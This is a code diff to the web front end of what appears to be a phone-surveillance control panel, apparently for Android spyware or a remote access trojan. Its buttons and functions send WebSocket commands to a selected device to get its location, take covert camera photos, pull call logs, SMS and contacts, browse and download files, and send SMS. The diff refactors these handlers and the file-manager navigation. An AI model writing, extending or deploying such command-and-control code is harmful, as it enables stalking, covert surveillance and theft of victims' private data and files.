@@ -329,15 +329,15 @@ table.ct td.ce{color:var(--text2);font-size:11px}
           </div>
         </div>
         <div class="cmd-grid">
-          <button class="cb" onclick="sc('get_location')">📍 Location</button>
-          <button class="cb" onclick="sc('capture_back')">📷 Camera</button>
-          <button class="cb" onclick="sc('capture_front')">🤳 Selfie</button>
-          <button class="cb" onclick="sc('get_call_log')">📞 Call Log</button>
-          <button class="cb" onclick="sc('get_sms')">💬 SMS File</button>
-          <button class="cb" onclick="sc('get_contacts')">👥 Contacts File</button>
-          <button class="cb green" onclick="loadContacts()">📋 View Contacts</button>
-          <button class="cb green" onclick="loadMessages()">📨 View SMS</button>
-          <button class="cb" onclick="sc('list_files',{path:''})">📁 File Manager</button>
+          <button class="cb" onclick="cmd('get_location')">📍 Location</button>
+          <button class="cb" onclick="cmd('capture_back')">📷 Camera</button>
+          <button class="cb" onclick="cmd('capture_front')">🤳 Selfie</button>
+          <button class="cb" onclick="cmd('get_call_log')">📞 Call Log</button>
+          <button class="cb" onclick="cmd('get_sms')">💬 SMS File</button>
+          <button class="cb" onclick="cmd('get_contacts')">👥 Contacts File</button>
+          <button class="cb" onclick="loadContacts()">📋 View Contacts</button>
+          <button class="cb" onclick="loadMessages()">📨 View SMS</button>
+          <button class="cb" onclick="openFm()">📁 File Manager</button>
           <button class="cb" onclick="toggleSms()">✉️ Send SMS</button>
         </div>
         <div id="sms-form">
@@ -505,24 +505,41 @@ function pickDev(id) {
 }
 
 // ── Commands
+function closeSmsForm() {
+  document.getElementById('sms-form').classList.remove('show');
+}
+
+// cmd() = close SMS form immediately + send command
+function cmd(action, params={}) {
+  closeSmsForm();
+  sc(action, params);
+}
+
 function sc(action, params={}) {
   if (!selId || !ws || ws.readyState !== 1) return;
   ws.send(JSON.stringify({ type:'send_command', deviceId:selId, action, params }));
 }
 
+function openFm() {
+  closeSmsForm();
+  sc('list_files', { path: '/' });
+}
+
 function loadContacts() {
+  closeSmsForm();
   if (!selId) return;
   const c = cache[selId]?.contacts;
   if (c) { showContacts(c); return; }
-  addText('Fetching contacts from device…');
+  addText('Fetching contacts…');
   sc('get_contacts_web');
 }
 
 function loadMessages() {
+  closeSmsForm();
   if (!selId) return;
   const m = cache[selId]?.messages;
   if (m) { showMessages(m); return; }
-  addText('Fetching messages from device…');
+  addText('Fetching messages…');
   sc('get_sms_web');
 }
 
@@ -572,26 +589,38 @@ function addLoc(m) {
 }
 
 // ── File Manager
+// Uses data-nav / data-dl attributes — no onclick string escaping (avoids double-quote bug)
+document.addEventListener('click', e => {
+  const nav = e.target.closest('[data-nav]');
+  if (nav) { sc('list_files', { path: nav.dataset.nav }); return; }
+  const dl = e.target.closest('[data-dl]');
+  if (dl) { e.stopPropagation(); sc('download_file', { path: dl.dataset.dl }); return; }
+  const back = e.target.closest('[data-back]');
+  if (back) { sc('list_files', { path: back.dataset.back }); }
+});
+
 function addFm(m) {
-  const path = m.path||'/';
-  const items = m.items||[];
-  let h = `<div class="fm-path">📂 ${x(path||'/')}</div>`;
+  const path = m.path || '/';
+  const items = m.items || [];
+  let h = `<div class="fm-path">📂 ${x(path)}</div>`;
   if (path && path !== '/') {
-    const par = path.includes('/') ? path.substring(0,path.lastIndexOf('/'))||'/' : '/';
-    h += `<div class="fm-back" onclick="sc('list_files',{path:${JSON.stringify(par)}})">← Back</div>`;
+    const par = path.lastIndexOf('/') > 0
+      ? path.substring(0, path.lastIndexOf('/'))
+      : '/';
+    h += `<div class="fm-back" data-back="${x(par)}">← Back</div>`;
   }
   if (!items.length) {
     h += '<div class="fm-empty">This folder is empty</div>';
   } else {
+    const base = path === '/' ? '' : path;
     h += '<div class="fm-list">';
     items.forEach(it => {
-      const base = path === '/' ? '' : path;
       if (it.isDir) {
         const np = base + '/' + it.name;
-        h += `<div class="fmi" onclick="sc('list_files',{path:${JSON.stringify(np)}})"><span class="fi">📁</span><span class="fn">${x(it.name)}</span><span class="fs">—</span></div>`;
+        h += `<div class="fmi" data-nav="${x(np)}"><span class="fi">📁</span><span class="fn">${x(it.name)}</span><span class="fs">—</span></div>`;
       } else {
         const fp = base + '/' + it.name;
-        h += `<div class="fmi"><span class="fi">${ficon(it.name)}</span><span class="fn">${x(it.name)}</span><span class="fs">${it.size||'—'}</span><button class="fdl" onclick="event.stopPropagation();sc('download_file',{path:${JSON.stringify(fp)}})">⬇ DL</button></div>`;
+        h += `<div class="fmi"><span class="fi">${ficon(it.name)}</span><span class="fn">${x(it.name)}</span><span class="fs">${it.size||'—'}</span><button class="fdl" data-dl="${x(fp)}">⬇ DL</button></div>`;
       }
     });
     h += '</div>';
